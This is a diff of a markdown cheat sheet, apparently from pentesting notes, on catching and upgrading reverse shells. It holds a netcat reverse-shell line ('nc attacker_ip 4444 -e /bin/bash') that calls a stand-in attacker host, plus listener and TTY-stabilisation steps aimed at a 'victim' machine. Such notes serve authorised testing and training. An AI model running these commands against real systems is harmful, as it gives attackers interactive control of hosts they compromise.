@@ -40,14 +40,17 @@ nc attacker_ip 4444 -e /bin/bash
 ```
 #### Additional Shell Info
 https://delta.navisec.io/reverse-shell-reference/
+
 https://www.revshells.com/
 
 #### Lazy upgrade way, works great on windows
+```
 Sudo apt install rlwrap
 rlwrap nc -lvp 4444
+```
 
 ## Enable fully-interactive shell 
-##### (tab complete, arrows keys, etc)(ONLY WORKS ON LINUX, use rlwrap in front of listener for windows)
+##### (allows tab complete, arrows keys, etc)(ONLY WORKS ON LINUX, use rlwrap in front of listener for windows)
 
 #### Validate python or python3 on the machine
 ```
@@ -65,8 +68,8 @@ Ctrl + Z (background the shell)
 stty raw -echo; fg
 reset
 ```
-#### If it asks what TERM to use, set it to 'xterm-256color'
-#### Validate Terminal Type
+## If it asks what TERM to use, set it to 'xterm-256color'
+### Validate Terminal Type
 ```
 echo $TERM
 export TERM=xterm-256color
@@ -88,3 +91,4 @@ stty rows 38 columns 116 (run on victim)
 Note: you'll want to run the second command with numbers from the first command, so you're setting the victim's shell size to your local kali machine's shell size. 
 This helps prevent wordwrap from distorting and will help other tools like nano and vim work as expected.
 
+You should now have a fully functional shell, where even sending a ^C (Ctrl + C, normally intended to stop processes) won't cause the shell to die. 
